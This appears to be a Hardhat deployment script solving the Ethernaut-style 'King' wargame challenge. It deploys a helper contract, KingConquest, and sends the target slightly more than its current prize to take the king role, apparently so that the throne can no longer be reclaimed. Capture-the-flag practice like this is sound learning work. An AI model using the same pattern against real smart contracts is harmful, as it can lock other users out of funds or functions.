const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------')

    const accounts = await ethers.getSigners();
    const sender = accounts[0];

    const kingAddress = addresses[scriptName];
    const kingContract = await ethers.getContractAt('IKing', kingAddress);
    let prize = await kingContract.prize();

    const KingConquest = await ethers.getContractFactory('KingConquest');
    const kingConquest = await KingConquest.deploy();
    const contract = await kingConquest.deployed();

    const txCallKing = await contract.callKing(kingAddress, {value: prize+1});

    console.log('----------End----------');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});


